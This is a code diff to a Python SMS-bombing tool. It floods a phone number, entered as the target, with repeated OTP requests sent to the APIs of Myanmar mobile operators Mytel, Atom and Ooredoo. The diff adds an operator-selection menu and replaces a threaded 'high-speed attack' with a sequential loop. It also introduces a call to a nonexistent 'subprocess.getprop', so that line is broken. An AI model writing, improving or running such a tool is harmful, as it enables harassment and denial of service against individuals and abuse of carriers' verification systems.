@@ -107,7 +107,7 @@ def get_id():
     try:
         serial = subprocess.getoutput('getprop ro.serialno').strip()
         android_id = subprocess.getoutput('settings get secure android_id').strip()
-        cpu = subprocess.getoutput('getprop ro.product.cpu.abi').strip()
+        cpu = subprocess.getprop('ro.product.cpu.abi').strip()
         if "not found" in serial.lower() or not serial:
             serial = platform.node()
         if "not found" in android_id.lower() or not android_id:
@@ -248,33 +248,30 @@ def call_mytel(phone):
 
 def call_atom(phone):
     try:
-        # Simplified Atom API Example (Needs real headers/data for full bypass)
         requests.post("https://api.atom.com.mm/v1/otp/send", json={"msisdn": phone}, timeout=5)
     except: pass
 
 def call_ooredoo(phone):
     try:
-        # Simplified Ooredoo API Example
         requests.get(f"https://www.ooredoo.com.mm/api/otp?phone={phone}", timeout=5)
     except: pass
 
-def send_otp_thread(phone):
-    # Randomly pick an API or call all
-    call_mytel(phone)
-    # call_atom(phone)
-    # call_ooredoo(phone)
-
-def start_bombing(p, c):
-    print(f"\n{W}[*] Initializing VIP High-Speed Threads for {C}{p}{W}...")
-    
-    # Use ThreadPoolExecutor for high speed
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for i in range(c):
-            executor.submit(send_otp_thread, p)
-            loading_bar(i + 1, c)
-            time.sleep(0.01) # Very small delay for speed
-            
-    print(f"\n{G}[+] High-Speed Attack Finished!{X}")
+def start_bombing(p, c, op):
+    print(f"\n{W}[*] Starting SMS Bomber for {C}{p}{W}...")
+    loading_bar(0, c)
+    for i in range(c):
+        try:
+            if op == '1': call_mytel(p)
+            elif op == '2': call_atom(p)
+            elif op == '3': call_ooredoo(p)
+            else: # All
+                call_mytel(p)
+                # call_atom(p)
+                # call_ooredoo(p)
+        except: pass
+        loading_bar(i + 1, c)
+        time.sleep(0.05) # Back to original speed
+    print(f"\n{G}[+] Process Finished Successfully!{X}")
     input(f"\n{W}Press Enter to return to menu...{X}")
 
 def show_profile(d_id):
@@ -329,6 +326,25 @@ def main_menu(d_id, model):
             transition_anim()
             while True:
                 banner()
+                print(f"  {Y}--- SELECT OPERATOR ---{X}")
+                print(f"  {W}╔══════════════════════════════════════╗")
+                print(f"  ║ {G}[1]{W} MYTEL API                       ║")
+                print(f"  ║ {G}[2]{W} ATOM API                        ║")
+                print(f"  ║ {G}[3]{W} OOREDOO API                     ║")
+                print(f"  ║ {G}[4]{W} ALL OPERATORS (MIXED)           ║")
+                print(f"  ║ {R}[b]{W} BACK TO MAIN MENU               ║")
+                print(f"  ╚══════════════════════════════════════╝")
+                op = input(f"\n{W}[?]{G} Select Operator: {W}").strip()
+                if op.lower() == 'b': 
+                    transition_anim()
+                    break
+                if op not in ['1', '2', '3', '4']:
+                    print(f"{R}[!] Invalid Choice{X}")
+                    time.sleep(1)
+                    continue
+                
+                transition_anim()
+                banner()
                 print(f"  {Y}--- SMS BOMBING PANEL ---{X}")
                 p = input(f"\n{W}[?]{G} Enter Target Phone {W}(or {R}'b'{W} to back): {C}")
                 if p.lower() == 'b': 
@@ -341,7 +357,7 @@ def main_menu(d_id, model):
                     continue
                 try:
                     c = int(input(f"{W}[?]{G} Enter Request Count: {W}"))
-                    start_bombing(p, c)
+                    start_bombing(p, c, op)
                     transition_anim()
                 except ValueError:
                     print(f"{R}[!] Invalid count.{X}")
